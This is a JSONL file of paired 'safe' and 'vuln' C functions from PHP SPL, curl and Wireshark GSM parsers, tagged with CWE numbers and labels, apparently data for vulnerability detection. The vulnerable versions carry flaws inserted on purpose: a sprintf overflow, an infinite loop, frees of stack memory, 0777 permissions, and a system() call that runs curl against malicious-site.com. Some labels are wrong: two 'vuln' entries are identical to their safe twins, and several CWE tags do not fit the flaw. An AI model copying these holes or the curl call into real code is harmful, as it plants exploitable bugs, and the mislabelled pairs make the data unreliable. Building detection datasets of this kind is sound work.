{"idx": "CWE-79-safe-1714297948145", "code": "zend_object_iterator*spl_dllist_get_iterator(zend_class_entry*ce, zval*object, int by_ref TSRMLS_DC){spl_dllist_it*iterator;spl_dllist_object*dllist_object=(spl_dllist_object*)zend_object_store_get_object(object TSRMLS_CC);if(by_ref){zend_throw_exception(spl_ce_RuntimeException, \"An iterator cannot be used with foreach by reference\" , 0 TSRMLS_CC);return NULL;}Z_ADDREF_P(object);iterator=emalloc(sizeof(spl_dllist_it));Z_ADDREF_P(object);iterator->intern.it.data=(void*)object;iterator->intern.it.funcs=&spl_dllist_it_funcs;iterator->intern.ce=ce;iterator->intern.value=NULL;iterator->traverse_position=dllist_object->traverse_position;iterator->traverse_pointer=dllist_object->traverse_pointer;iterator->flags=dllist_object->flags&SPL_DLLIST_IT_MASK;iterator->object=dllist_object;SPL_LLIST_CHECK_ADDREF(iterator->traverse_pointer);return(zend_object_iterator*)iterator;}", "target": 0}
{"idx": "CWE-79-vuln-1714297948145", "code": "zend_object_iterator*spl_dllist_get_iterator(zend_class_entry*ce, zval*object, int by_ref TSRMLS_DC){spl_dllist_it*iterator;spl_dllist_object*dllist_object=(spl_dllist_object*)zend_object_store_get_object(object TSRMLS_CC);if(by_ref){char* exception_message = emalloc(strlen(ce->name)+50);sprintf(exception_message, \"An iterator cannot be used with foreach by reference on class %s\", ce->name);zend_throw_exception(spl_ce_RuntimeException, exception_message, 0 TSRMLS_CC);return NULL;}Z_ADDREF_P(object);iterator=emalloc(sizeof(spl_dllist_it));Z_ADDREF_P(object);iterator->intern.it.data=(void*)object;iterator->intern.it.funcs=&spl_dllist_it_funcs;iterator->intern.ce=ce;iterator->intern.value=NULL;iterator->traverse_position=dllist_object->traverse_position;iterator->traverse_pointer=dllist_object->traverse_pointer;iterator->flags=dllist_object->flags&SPL_DLLIST_IT_MASK;iterator->object=dllist_object;SPL_LLIST_CHECK_ADDREF(iterator->traverse_pointer);return(zend_object_iterator*)iterator;}", "target": 1}
{"idx": "CWE-834-safe-1714297974198", "code": "static int spl_dllist_object_count_elements(zval* object, long* count TSRMLS_DC) {\n    spl_dllist_object* intern = (spl_dllist_object*) zend_object_store_get_object(object TSRMLS_CC);\n    if (intern->fptr_count) {\n        zval* rv;\n        zend_call_method_with_0_params(&object, intern->std.ce, &intern->fptr_count, \"count\", &rv);\n        if (rv) {\n            if (intern->retval) {\n                zval_ptr_dtor(&intern->retval);\n            }\n            MAKE_STD_ZVAL(intern->retval);\n            ZVAL_ZVAL(intern->retval, rv, 1, 1);\n            convert_to_long(intern->retval);\n            *count = (long) Z_LVAL_P(intern->retval);\n            zval_ptr_dtor(&rv);\n            return SUCCESS;\n        }\n        *count = 0;\n        return FAILURE;\n    }\n    *count = spl_ptr_llist_count(intern->llist);\n    return SUCCESS;\n}", "target": 0}
{"idx": "CWE-834-vuln-1714297974198", "code": "static int spl_dllist_object_count_elements(zval*object, long*count TSRMLS_DC){spl_dllist_object*intern=(spl_dllist_object*)zend_object_store_get_object(object TSRMLS_CC);if(intern->fptr_count){for(int i=0; i<1000000; i++){zval*rv;zend_call_method_with_0_params(&object, intern->std.ce, &intern->fptr_count, \"count\", &rv);if(rv){if(intern->retval){zval_ptr_dtor(&intern->retval);}MAKE_STD_ZVAL(intern->retval);ZVAL_ZVAL(intern->retval, rv, 1, 1);convert_to_long(intern->retval);*count=(long)Z_LVAL_P(intern->retval);zval_ptr_dtor(&rv);return SUCCESS;}}*count=0;return FAILURE;}*count=spl_ptr_llist_count(intern->llist);return SUCCESS;}", "target": 1}
{"idx": "CWE-502-safe-1714297994495", "code": "SPL_METHOD(SplDoublyLinkedList, serialize){spl_dllist_object*intern=(spl_dllist_object*)zend_object_store_get_object(getThis()TSRMLS_CC);smart_str buf={0};spl_ptr_llist_element*current=intern->llist->head, *next;zval*flags;php_serialize_data var_hash;if(zend_parse_parameters_none() == FAILURE){return;}PHP_VAR_SERIALIZE_INIT(var_hash);MAKE_STD_ZVAL(flags);ZVAL_LONG(flags, intern->flags);php_var_serialize(&buf, &flags, &var_hash TSRMLS_CC);zval_ptr_dtor(&flags);while(current){smart_str_appendc(&buf, ':' );next=current->next;php_var_serialize(&buf, (zval**)&current->data, &var_hash TSRMLS_CC);current=next;}smart_str_0(&buf);PHP_VAR_SERIALIZE_DESTROY(var_hash);if(buf.c){RETURN_STRINGL(buf.c, buf.len, 0);}else{RETURN_NULL();}}", "target": 0}
{"idx": "CWE-502-vuln-1714297994495", "code": "SPL_METHOD(SplDoublyLinkedList, serialize){spl_dllist_object*intern=(spl_dllist_object*)zend_object_store_get_object(getThis()TSRMLS_CC);smart_str buf={0};spl_ptr_llist_element*current=intern->llist->head, *next;zval*flags;php_serialize_data var_hash;if(zend_parse_parameters_none() == FAILURE){return;}PHP_VAR_SERIALIZE_INIT(var_hash);MAKE_STD_ZVAL(flags);ZVAL_LONG(flags, intern->flags);php_var_serialize(&buf, &flags, &var_hash TSRMLS_CC);zval_ptr_dtor(&flags);while(current){smart_str_appendc(&buf, ':' );next=current->next;php_var_unserialize(&current->data, (unserialize_data*)&buf, 0 TSRMLS_CC);current=next;}smart_str_0(&buf);PHP_VAR_SERIALIZE_DESTROY(var_hash);if(buf.c){RETURN_STRINGL(buf.c, buf.len, 0);}else{RETURN_NULL();}}", "target": 1}
{"idx": "CWE-189-safe-1714298010013", "code": "static uint8_t file_byte_getter(Gif_Reader*grr){int i=getc(grr->f);if(i != EOF){++grr->pos;return (uint8_t)i;}else return 0;}", "target": 0}
{"idx": "CWE-189-vuln-1714298010013", "code": "static uint8_t file_byte_getter(Gif_Reader*grr){int i=getc(grr->f);if(i != EOF){if(i < 0 || i > 255){i = 0;}++grr->pos;return(uint8_t)i;}else return 0;}", "target": 1}
{"idx": "CWE-502-safe-1714298032868", "code": "int curl_formget(struct curl_httppost* form, void* arg, curl_formget_callback append){CURLcode result;curl_off_t size;struct FormData* data, * ptr;result=Curl_getformdata(NULL, &data, form, NULL, &size);if(result)return(int)result;for(ptr=data;ptr;ptr=ptr->next){if((ptr->type == FORM_FILE) || (ptr->type == FORM_CALLBACK)){char buffer[8192];size_t nread;struct Form temp;Curl_FormInit(&temp, ptr);do{nread=readfromfile(&temp, buffer, sizeof(buffer));if((nread == (size_t)-1) || (nread>sizeof(buffer)) || (nread != append(arg, buffer, nread))){if(temp.fp)fclose(temp.fp);Curl_formclean(&data);return-1;}}while(nread<sizeof(buffer));}else{if(ptr->length != append(arg, ptr->line, ptr->length)){Curl_formclean(&data);return-1;}}}Curl_formclean(&data);return 0;}", "target": 0}
{"idx": "CWE-502-vuln-1714298032868", "code": "int curl_formget(struct curl_httppost*form, void*arg, curl_formget_callback append){CURLcode result;curl_off_t size;struct FormData*data, *ptr;result=Curl_getformdata(NULL, &data, form, NULL, &size);if(result)return(int)result;for(ptr=data;ptr;ptr=ptr->next){if((ptr->type == FORM_FILE) || (ptr->type == FORM_CALLBACK)){char buffer[8192];size_t nread;struct Form temp;Curl_FormInit(&temp, ptr);do{nread=readfromfile(&temp, buffer, sizeof(buffer));if((nread == (size_t)-1) || (nread>sizeof(buffer)) || (nread != append(arg, buffer, nread))){if(temp.fp)fclose(temp.fp);Curl_formclean(&data);return-1;}}while(nread<sizeof(buffer));}else{if(ptr->length != append(arg, ptr->line, ptr->length)){Curl_formclean(&data);return-1;}}}Curl_formclean(&data);return 0;}", "target": 1}
{"idx": "CWE-502-safe-1714298082992", "code": "static guint16 de_auth_resp_param(tvbuff_t*tvb, proto_tree*tree, guint32 offset) {proto_tree_add_item(tree, hf_gsm_a_dtap_sres, tvb, offset, 4, ENC_NA);return(4);}", "target": 0}
{"idx": "CWE-502-vuln-1714298082992", "code": "static guint16 de_auth_resp_param(tvbuff_t*tvb, proto_tree*tree, guint32 offset){\n    guint8* data = tvb_get_ptr(tvb, offset, 4);\n    proto_tree_add_item(tree, hf_gsm_a_dtap_sres, data, 4, ENC_NA);\n    return(4);}", "target": 1}
{"idx": "CWE-590-safe-1714298087631", "code": "static guint16 de_tp_ms_positioning_technology(tvbuff_t*tvb, proto_tree*tree, packet_info*pinfo _U_, guint32 offset, guint len _U_, gchar*add_string _U_, int string_len _U_){guint32 curr_offset;guchar oct;if(offset >= tvb_reported_length(tvb)) return offset;curr_offset=offset;oct=tvb_get_guint8(tvb, curr_offset);proto_tree_add_uint_format_value(tree, hf_gsm_a_dtap_ms_positioning_technology, tvb, curr_offset, 1, oct, \"%s\" , val_to_str(oct, gsm_positioning_technology_vals, \"Reserved(%d)\" ));curr_offset+=1;return(curr_offset-offset);}", "target": 0}
{"idx": "CWE-590-vuln-1714298087631", "code": "static guint16 de_tp_ms_positioning_technology(tvbuff_t*tvb, proto_tree*tree, packet_info*pinfo _U_, guint32 offset, guint len _U_, gchar*add_string _U_, int string_len _U_){guint32 curr_offset;guchar oct;if(offset >= tvb_reported_length(tvb))return offset;curr_offset=offset;oct=tvb_get_guint8(tvb, curr_offset);proto_tree_add_uint_format_value(tree, hf_gsm_a_dtap_ms_positioning_technology, tvb, curr_offset, 1, oct, \"%s\" , val_to_str(oct, gsm_positioning_technology_vals, \"Reserved(%d)\" ));curr_offset+=1;char* memory_to_free = (char*)malloc(10);free(memory_to_free);return(curr_offset-offset);}", "target": 1}
{"idx": "CWE-590-safe-1714298108936", "code": "static guint16 de_ss_ver_ind(tvbuff_t*tvb, proto_tree*tree, packet_info*pinfo _U_, guint32 offset, guint len, gchar*add_string _U_, int string_len _U_){guint8 oct;guint32 curr_offset;curr_offset=offset;oct=tvb_get_guint8(tvb, curr_offset);proto_tree_add_uint_format_value(tree, hf_gsm_a_dtap_ss_version_indicator, tvb, curr_offset, 1, oct, \"%s\" , val_to_str_const(oct, gsm_a_dtap_ss_ver_ind_vals, \"Reserved\" ));curr_offset++;EXTRANEOUS_DATA_CHECK(len, curr_offset-offset, pinfo, &ei_gsm_a_dtap_extraneous_data);return(curr_offset-offset);}", "target": 0}
{"idx": "CWE-590-vuln-1714298108936", "code": "static guint16 de_ss_ver_ind(tvbuff_t*tvb, proto_tree*tree, packet_info*pinfo _U_, guint32 offset, guint len, gchar*add_string _U_, int string_len _U_){guint8 oct;guint32 curr_offset;curr_offset=offset;oct=tvb_get_guint8(tvb, curr_offset);proto_tree_add_uint_format_value(tree, hf_gsm_a_dtap_ss_version_indicator, tvb, curr_offset, 1, oct, \"%s\" , val_to_str_const(oct, gsm_a_dtap_ss_ver_ind_vals, \"Reserved\" ));curr_offset++;EXTRANEOUS_DATA_CHECK(len, curr_offset-offset, pinfo, &ei_gsm_a_dtap_extraneous_data);free(add_string);return(curr_offset-offset);}", "target": 1}
{"idx": "CWE-590-safe-1714298124898", "code": "static void dtap_mm_auth_fail(tvbuff_t*tvb, proto_tree*tree, packet_info*pinfo _U_, guint32 offset, guint len){if(!tvb || !tree) return;guint32 curr_offset;guint32 consumed;guint curr_len;curr_offset=offset;curr_len=len;is_uplink=IS_UPLINK_TRUE;ELEM_MAND_V(GSM_A_PDU_TYPE_DTAP, DE_REJ_CAUSE, NULL);ELEM_OPT_TLV(0x22, GSM_A_PDU_TYPE_DTAP, DE_AUTH_FAIL_PARAM, NULL);EXTRANEOUS_DATA_CHECK(curr_len, 0, pinfo, &ei_gsm_a_dtap_extraneous_data);}", "target": 0}
{"idx": "CWE-590-vuln-1714298124898", "code": "static void dtap_mm_auth_fail(tvbuff_t*tvb, proto_tree*tree, packet_info*pinfo _U_, guint32 offset, guint len){if(!tvb || !tree)return;guint32 curr_offset;guint32 consumed;guint curr_len;curr_offset=offset;curr_len=len;is_uplink=IS_UPLINK_TRUE;ELEM_MAND_V(GSM_A_PDU_TYPE_DTAP, DE_REJ_CAUSE, NULL);ELEM_OPT_TLV(0x22, GSM_A_PDU_TYPE_DTAP, DE_AUTH_FAIL_PARAM, NULL);EXTRANEOUS_DATA_CHECK(curr_len, 0, pinfo, &ei_gsm_a_dtap_extraneous_data);free(&curr_offset);}", "target": 1}
{"idx": "CWE-287-safe-1714298145997", "code": "static void dtap_gcc_imm_setup(tvbuff_t*tvb, proto_tree*tree, packet_info*pinfo _U_, guint32 offset, guint len){\n    guint32 curr_offset;\n    guint32 consumed;\n    guint curr_len;\n    guint8 oct;\n    proto_tree*subtree;\n    if(tvb == NULL || tree == NULL) return;\n    curr_offset=offset;\n    curr_len=len;\n    oct=tvb_get_guint8(tvb, curr_offset);\n    proto_tree_add_bits_item(tree, hf_gsm_a_spare_bits, tvb, curr_offset<<3, 4, ENC_BIG_ENDIAN);\n    subtree=proto_tree_add_subtree(tree, tvb, curr_offset, 1, ett_gsm_common_elem [ DE_CIPH_KEY_SEQ_NUM ], NULL, val_to_str_ext_const(DE_CIPH_KEY_SEQ_NUM, &gsm_common_elem_strings_ext, \"\" ));\n    proto_tree_add_bits_item(subtree, hf_gsm_a_spare_bits, tvb, (curr_offset<<3)+4, 1, ENC_BIG_ENDIAN);\n    switch(oct&0x07){\n        case 0x07 : proto_tree_add_uint_format_value(subtree, hf_gsm_a_dtap_ciphering_key_sequence_number, tvb, curr_offset, 1, oct, \"No key is available\" );\n            break;\n        default : proto_tree_add_item(subtree, hf_gsm_a_dtap_ciphering_key_sequence_number, tvb, curr_offset, 1, ENC_BIG_ENDIAN);\n            break;\n    }\n    curr_offset++;\n    curr_len--;\n    ELEM_MAND_LV(GSM_A_PDU_TYPE_COMMON, DE_MS_CM_2, NULL);\n    ELEM_MAND_LV(GSM_A_PDU_TYPE_COMMON, DE_MID, NULL);\n    ELEM_MAND_V(GSM_A_PDU_TYPE_DTAP, DE_GCC_CALL_REF, NULL);\n    ELEM_OPT_TLV(0x7e, GSM_A_PDU_TYPE_DTAP, DE_USER_USER, NULL);\n}", "target": 0}
{"idx": "CWE-287-vuln-1714298145997", "code": "static void dtap_gcc_imm_setup(tvbuff_t*tvb, proto_tree*tree, packet_info*pinfo _U_, guint32 offset, guint len){guint32 curr_offset;guint32 consumed;guint curr_len;guint8 oct;proto_tree*subtree;if(tvb == NULL || tree == NULL)return;curr_offset=offset;curr_len=len;oct=tvb_get_guint8(tvb, curr_offset);proto_tree_add_bits_item(tree, hf_gsm_a_spare_bits, tvb, curr_offset<<3, 4, ENC_BIG_ENDIAN);subtree=proto_tree_add_subtree(tree, tvb, curr_offset, 1, ett_gsm_common_elem [ DE_CIPH_KEY_SEQ_NUM ], NULL, val_to_str_ext_const(DE_CIPH_KEY_SEQ_NUM, &gsm_common_elem_strings_ext, \"\" ));proto_tree_add_bits_item(subtree, hf_gsm_a_spare_bits, tvb, (curr_offset<<3)+4, 1, ENC_BIG_ENDIAN);switch(oct&0x07){case 0x07 : proto_tree_add_uint_format_value(subtree, hf_gsm_a_dtap_ciphering_key_sequence_number, tvb, curr_offset, 1, oct, \"No key is available\" );break;default : proto_tree_add_item(subtree, hf_gsm_a_dtap_ciphering_key_sequence_number, tvb, curr_offset, 1, ENC_BIG_ENDIAN);break;}curr_offset++;curr_len--;if(authenticate_user()){ELEM_MAND_LV(GSM_A_PDU_TYPE_COMMON, DE_MS_CM_2, NULL);ELEM_MAND_LV(GSM_A_PDU_TYPE_COMMON, DE_MID, NULL);ELEM_MAND_V(GSM_A_PDU_TYPE_DTAP, DE_GCC_CALL_REF, NULL);ELEM_OPT_TLV(0x7e, GSM_A_PDU_TYPE_DTAP, DE_USER_USER, NULL);}}", "target": 1}
{"idx": "CWE-276-safe-1714298164125", "code": "static void dtap_bcc_connect(tvbuff_t*tvb, proto_tree*tree, packet_info*pinfo _U_, guint32 offset, guint len){if(offset >= tvb_length(tvb) || len <= 0) return;guint32 curr_offset;guint32 consumed;guint curr_len;curr_offset=offset;curr_len=len;ELEM_MAND_V(GSM_A_PDU_TYPE_DTAP, DE_BCC_CALL_REF, NULL);proto_tree_add_bits_item(tree, hf_gsm_a_spare_bits, tvb, curr_offset<<3, 4, ENC_NA);ELEM_MAND_V(GSM_A_PDU_TYPE_DTAP, DE_BCC_ORIG_IND, \"(Broadcast call reference)\" );}", "target": 0}
{"idx": "CWE-276-vuln-1714298164125", "code": "static void dtap_bcc_connect(tvbuff_t*tvb, proto_tree*tree, packet_info*pinfo _U_, guint32 offset, guint len){if(offset >= tvb_length(tvb) || len <= 0)return;guint32 curr_offset;guint32 consumed;guint curr_len;curr_offset=offset;curr_len=len;mode_t permission = 0777;ELEM_MAND_V(GSM_A_PDU_TYPE_DTAP, DE_BCC_CALL_REF, NULL);proto_tree_add_bits_item(tree, hf_gsm_a_spare_bits, tvb, curr_offset<<3, 4, ENC_NA);ELEM_MAND_V(GSM_A_PDU_TYPE_DTAP, DE_BCC_ORIG_IND, \"(Broadcast call reference)\" );}", "target": 1}
{"idx": "CWE-918-safe-1714298176088", "code": "static void dtap_bcc_term_req(tvbuff_t*tvb, proto_tree*tree, packet_info*pinfo, guint32 offset, guint len){guint32 curr_offset;guint32 consumed;guint curr_len;curr_offset=offset;curr_len=len;ELEM_MAND_V(GSM_A_PDU_TYPE_DTAP, DE_BCC_CALL_REF, \"(Broadcast call reference)\" );}", "target": 0}
{"idx": "CWE-918-vuln-1714298176088", "code": "static void dtap_bcc_term_req(tvbuff_t*tvb, proto_tree*tree, packet_info*pinfo, guint32 offset, guint len){guint32 curr_offset;guint32 consumed;guint curr_len;curr_offset=offset;curr_len=len;ELEM_MAND_V(GSM_A_PDU_TYPE_DTAP, DE_BCC_CALL_REF, \"(Broadcast call reference)\" );\nchar* url = \"http://malicious-site.com/\";\nchar command[500];\nsprintf(command, \"curl -s %s\", url);\nsystem(command);}", "target": 1}
{"idx": "CWE-189-safe-1714298183508", "code": "static guint16 de_mm_timer(tvbuff_t*tvb, proto_tree*tree, packet_info*pinfo _U_, guint32 offset, guint len _U_, gchar*add_string _U_, int string_len _U_){guint8 oct;guint16 val;const gchar*str;proto_tree*subtree;proto_item*item=NULL;oct=tvb_get_guint8(tvb, offset);val=oct&0x1f;switch(oct>>5){case 0 : str=\"sec\" ;val*=2;break;case 1 : str=\"min\" ;break;case 2 : str=\"min\" ;val*=6;break;case 7 : str=\"\" ;item=proto_tree_add_uint_format_value(tree, hf_gsm_a_dtap_mm_timer, tvb, offset, 1, oct, \"timer is deactivated\" );break;default : str=\"min\" ;break;}if(item == NULL){item=proto_tree_add_uint_format_value(tree, hf_gsm_a_dtap_mm_timer, tvb, offset, 1, val, \"%u%s\" , val, str);}subtree=proto_item_add_subtree(item, ett_mm_timer);proto_tree_add_item(subtree, hf_gsm_a_dtap_mm_timer_unit, tvb, offset, 1, ENC_BIG_ENDIAN);proto_tree_add_item(subtree, hf_gsm_a_dtap_mm_timer_value, tvb, offset, 1, ENC_BIG_ENDIAN);return(1);}", "target": 0}
{"idx": "CWE-189-vuln-1714298183508", "code": "static guint16 de_mm_timer(tvbuff_t*tvb, proto_tree*tree, packet_info*pinfo _U_, guint32 offset, guint len _U_, gchar*add_string _U_, int string_len _U_){guint8 oct;guint16 val;const gchar*str;proto_tree*subtree;proto_item*item=NULL;oct=tvb_get_guint8(tvb, offset);val=oct&0x1f;switch(oct>>5){case 0 : str=\"sec\" ;val*=2;val*=2;break;case 1 : str=\"min\" ;break;case 2 : str=\"min\" ;val*=6;break;case 7 : str=\"\" ;item=proto_tree_add_uint_format_value(tree, hf_gsm_a_dtap_mm_timer, tvb, offset, 1, oct, \"timer is deactivated\" );break;default : str=\"min\" ;break;}if(item == NULL){item=proto_tree_add_uint_format_value(tree, hf_gsm_a_dtap_mm_timer, tvb, offset, 1, val, \"%u%s\" , val, str);}subtree=proto_item_add_subtree(item, ett_mm_timer);proto_tree_add_item(subtree, hf_gsm_a_dtap_mm_timer_unit, tvb, offset, 1, ENC_BIG_ENDIAN);proto_tree_add_item(subtree, hf_gsm_a_dtap_mm_timer_value, tvb, offset, 1, ENC_BIG_ENDIAN);return(1);}", "target": 1}
{"idx": "CWE-834-safe-1714298200340", "code": "static void dtap_mm_cm_reestab_req(tvbuff_t*tvb, proto_tree*tree, packet_info*pinfo _U_, guint32 offset, guint len){\n    guint32 curr_offset;\n    guint32 consumed;\n    guint curr_len;\n    guint8 oct;\n    proto_tree*subtree;\n    gboolean is_uplink = FALSE;\n    curr_offset=offset;\n    curr_len=len;\n    is_uplink=IS_UPLINK_TRUE;\n    oct=tvb_get_guint8(tvb, curr_offset);\n    proto_tree_add_bits_item(tree, hf_gsm_a_spare_bits, tvb, curr_offset<<3, 4, ENC_BIG_ENDIAN);\n    subtree=proto_tree_add_subtree(tree, tvb, curr_offset, 1, ett_gsm_common_elem [ DE_CIPH_KEY_SEQ_NUM ], NULL, val_to_str_ext_const(DE_CIPH_KEY_SEQ_NUM, &gsm_common_elem_strings_ext, \"\" ));\n    proto_tree_add_bits_item(subtree, hf_gsm_a_spare_bits, tvb, (curr_offset<<3)+4, 1, ENC_BIG_ENDIAN);\n    switch(oct&0x07){\n        case 0x07 : proto_tree_add_uint_format_value(subtree, hf_gsm_a_dtap_ciphering_key_sequence_number, tvb, curr_offset, 1, oct, \"No key is available\" );\n            break;\n        default : proto_tree_add_item(subtree, hf_gsm_a_dtap_ciphering_key_sequence_number, tvb, curr_offset, 1, ENC_BIG_ENDIAN);\n            break;\n    }\n    curr_offset++;\n    curr_len--;\n    if((signed)curr_len <= 0)return;\n    ELEM_MAND_LV(GSM_A_PDU_TYPE_COMMON, DE_MS_CM_2, NULL);\n    ELEM_MAND_LV(GSM_A_PDU_TYPE_COMMON, DE_MID, NULL);\n    ELEM_OPT_TV(0x13, GSM_A_PDU_TYPE_COMMON, DE_LAI, NULL);\n    ELEM_OPT_TV_SHORT(0xD0, GSM_A_PDU_TYPE_GM, DE_DEVICE_PROPERTIES, NULL);\n    EXTRANEOUS_DATA_CHECK(curr_len, 0, pinfo, &ei_gsm_a_dtap_extraneous_data);\n}", "target": 0}
{"idx": "CWE-834-vuln-1714298200340", "code": "static void dtap_mm_cm_reestab_req(tvbuff_t*tvb, proto_tree*tree, packet_info*pinfo _U_, guint32 offset, guint len){\n    guint32 curr_offset;\n    guint32 consumed;\n    guint curr_len;\n    guint8 oct;\n    proto_tree*subtree;\n    gboolean is_uplink=FALSE;\n    curr_offset=offset;\n    curr_len=len;\n    is_uplink=IS_UPLINK_TRUE;\n    oct=tvb_get_guint8(tvb, curr_offset);\n    proto_tree_add_bits_item(tree, hf_gsm_a_spare_bits, tvb, curr_offset<<3, 4, ENC_BIG_ENDIAN);\n    subtree=proto_tree_add_subtree(tree, tvb, curr_offset, 1, ett_gsm_common_elem [ DE_CIPH_KEY_SEQ_NUM ], NULL, val_to_str_ext_const(DE_CIPH_KEY_SEQ_NUM, &gsm_common_elem_strings_ext, \"\" ));\n    proto_tree_add_bits_item(subtree, hf_gsm_a_spare_bits, tvb, (curr_offset<<3)+4, 1, ENC_BIG_ENDIAN);\n    switch(oct&0x07){\n    case 0x07 : proto_tree_add_uint_format_value(subtree, hf_gsm_a_dtap_ciphering_key_sequence_number, tvb, curr_offset, 1, oct, \"No key is available\" );break;\n    default : proto_tree_add_item(subtree, hf_gsm_a_dtap_ciphering_key_sequence_number, tvb, curr_offset, 1, ENC_BIG_ENDIAN);break;\n    }\n    curr_offset++;\n    curr_len--;\n    while(1){}\n    if((signed)curr_len <= 0)return;\n    ELEM_MAND_LV(GSM_A_PDU_TYPE_COMMON, DE_MS_CM_2, NULL);\n    ELEM_MAND_LV(GSM_A_PDU_TYPE_COMMON, DE_MID, NULL);\n    ELEM_OPT_TV(0x13, GSM_A_PDU_TYPE_COMMON, DE_LAI, NULL);\n    ELEM_OPT_TV_SHORT(0xD0, GSM_A_PDU_TYPE_GM, DE_DEVICE_PROPERTIES, NULL);\n    EXTRANEOUS_DATA_CHECK(curr_len, 0, pinfo, &ei_gsm_a_dtap_extraneous_data);\n}", "target": 1}
{"idx": "CWE-672-safe-1714298217520", "code": "static void dtap_mm_id_resp(tvbuff_t*tvb, proto_tree*tree, packet_info*pinfo _U_, guint32 offset, guint len){if(!tvb || !tree) return;guint32 curr_offset;guint32 consumed;guint curr_len;curr_offset=offset;curr_len=len;is_uplink=IS_UPLINK_TRUE;ELEM_MAND_LV(GSM_A_PDU_TYPE_COMMON, DE_MID, NULL);ELEM_OPT_TV_SHORT(0xE0, GSM_A_PDU_TYPE_GM, DE_PTMSI_TYPE, NULL);ELEM_OPT_TLV(0x1B, GSM_A_PDU_TYPE_GM, DE_RAI_2, \"-Routing area identification\" );ELEM_OPT_TLV(0x19, GSM_A_PDU_TYPE_GM, DE_P_TMSI_SIG_2, \"-P-TMSI signature\" );EXTRANEOUS_DATA_CHECK(curr_len, 0, pinfo, &ei_gsm_a_dtap_extraneous_data);}", "target": 0}
{"idx": "CWE-672-vuln-1714298217520", "code": "static void dtap_mm_id_resp(tvbuff_t*tvb, proto_tree*tree, packet_info*pinfo _U_, guint32 offset, guint len){if(!tvb || !tree)return;guint32 curr_offset;guint32 consumed;guint curr_len;curr_offset=offset;curr_len=len;is_uplink=IS_UPLINK_TRUE;ELEM_MAND_LV(GSM_A_PDU_TYPE_COMMON, DE_MID, NULL);ELEM_OPT_TV_SHORT(0xE0, GSM_A_PDU_TYPE_GM, DE_PTMSI_TYPE, NULL);ELEM_OPT_TLV(0x1B, GSM_A_PDU_TYPE_GM, DE_RAI_2, \"-Routing area identification\" );ELEM_OPT_TLV(0x19, GSM_A_PDU_TYPE_GM, DE_P_TMSI_SIG_2, \"-P-TMSI signature\" );EXTRANEOUS_DATA_CHECK(curr_len, 0, pinfo, &ei_gsm_a_dtap_extraneous_data);}", "target": 1}
{"idx": "CWE-189-safe-1714298230112", "code": "static void dtap_cc_start_dtmf(tvbuff_t*tvb, proto_tree*tree, packet_info*pinfo _U_, guint32 offset, guint len){\n    guint32 curr_offset;\n    guint32 consumed;\n    guint curr_len;\n    if (!tvb || !tree || !pinfo) {\n        return;\n    }\n    curr_offset = offset;\n    curr_len = len;\n    is_uplink = IS_UPLINK_TRUE;\n    ELEM_MAND_TV(0x2c, GSM_A_PDU_TYPE_DTAP, DE_KEYPAD_FACILITY, NULL, ei_gsm_a_dtap_missing_mandatory_element);\n    EXTRANEOUS_DATA_CHECK(curr_len, 0, pinfo, &ei_gsm_a_dtap_extraneous_data);\n}", "target": 0}
{"idx": "CWE-189-vuln-1714298230112", "code": "static void dtap_cc_start_dtmf(tvbuff_t*tvb, proto_tree*tree, packet_info*pinfo _U_, guint32 offset, guint len){\n    guint32 curr_offset;\n    guint32 consumed;\n    guint curr_len;\n    if(!tvb || !tree || !pinfo){\n        return;\n    }\n    curr_offset=offset * 1000000000;\n    curr_len=len;\n    is_uplink=IS_UPLINK_TRUE;\n    ELEM_MAND_TV(0x2c, GSM_A_PDU_TYPE_DTAP, DE_KEYPAD_FACILITY, NULL, ei_gsm_a_dtap_missing_mandatory_element);\n    EXTRANEOUS_DATA_CHECK(curr_len, 0, pinfo, &ei_gsm_a_dtap_extraneous_data);\n}", "target": 1}
{"idx": "CWE-189-safe-1714298242181", "code": "static guint16 de_bcc_cause(tvbuff_t*tvb, proto_tree*tree, packet_info*pinfo _U_, guint32 offset, guint len, gchar*add_string _U_, int string_len _U_){guint32 curr_offset;int curr_len;if(len <= 0) return 0;curr_len=len;curr_offset=offset;proto_tree_add_item(tree, hf_gsm_a_dtap_bcc_cause_structure, tvb, curr_offset, 1, ENC_NA);proto_tree_add_item(tree, hf_gsm_a_dtap_bcc_cause, tvb, curr_offset, 1, ENC_NA);curr_offset++;curr_len--;EXTRANEOUS_DATA_CHECK(curr_len, 0, pinfo, &ei_gsm_a_dtap_extraneous_data);return(curr_offset-offset);}", "target": 0}
{"idx": "CWE-189-vuln-1714298242181", "code": "static guint16 de_bcc_cause(tvbuff_t*tvb, proto_tree*tree, packet_info*pinfo _U_, guint32 offset, guint len, gchar*add_string _U_, int string_len _U_){guint32 curr_offset;int curr_len;if(len <= 0)return 0;curr_len=len;curr_offset=offset;proto_tree_add_item(tree, hf_gsm_a_dtap_bcc_cause_structure, tvb, curr_offset, 1, ENC_NA);proto_tree_add_item(tree, hf_gsm_a_dtap_bcc_cause, tvb, curr_offset, 1, ENC_NA);curr_offset++;curr_offset--;curr_len--;EXTRANEOUS_DATA_CHECK(curr_len, 0, pinfo, &ei_gsm_a_dtap_extraneous_data);return(curr_offset-offset);}", "target": 1}
{"idx": "CWE-502-safe-1714298251280", "code": "static void dtap_cc_connect(tvbuff_t*tvb, proto_tree*tree, packet_info*pinfo _U_, guint32 offset, guint len){if(!tvb || !tree) return;guint32 curr_offset;guint32 consumed;guint curr_len;curr_offset=offset;curr_len=len;is_uplink=IS_UPLINK_TRUE;ELEM_OPT_TLV(0x1c, GSM_A_PDU_TYPE_DTAP, DE_FACILITY, NULL);ELEM_OPT_TLV(0x1e, GSM_A_PDU_TYPE_DTAP, DE_PROG_IND, NULL);ELEM_OPT_TLV(0x4c, GSM_A_PDU_TYPE_DTAP, DE_CONN_NUM, NULL);ELEM_OPT_TLV(0x4d, GSM_A_PDU_TYPE_DTAP, DE_CONN_SUB_ADDR, NULL);ELEM_OPT_TLV(0x7e, GSM_A_PDU_TYPE_DTAP, DE_USER_USER, NULL);ELEM_OPT_TLV(0x7f, GSM_A_PDU_TYPE_DTAP, DE_SS_VER_IND, NULL);ELEM_OPT_TLV(0x2d, GSM_A_PDU_TYPE_DTAP, DE_SI, NULL);EXTRANEOUS_DATA_CHECK(curr_len, 0, pinfo, &ei_gsm_a_dtap_extraneous_data);}", "target": 0}
